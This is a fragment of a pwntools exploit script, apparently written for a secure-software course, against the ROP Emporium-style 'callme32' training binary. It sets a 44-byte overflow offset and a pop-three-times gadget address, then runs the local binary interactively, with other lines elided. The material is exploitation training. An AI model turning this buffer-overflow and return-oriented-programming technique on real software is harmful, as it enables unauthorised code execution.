...
payload=b'' # used for sending payload later
pop_3_times=p32(0x080487f9) # Calls pop 3x into esi,edi and ebp
offset=b'a'*44  # 28h + 4 bytes to overwrite ebp
...
p=process('/home/kali/Desktop/CPEG676-SecureSoftware/PCPs/Pacecar11_and_12/callme32')
...
p.interactive()          # Recieve message after sending
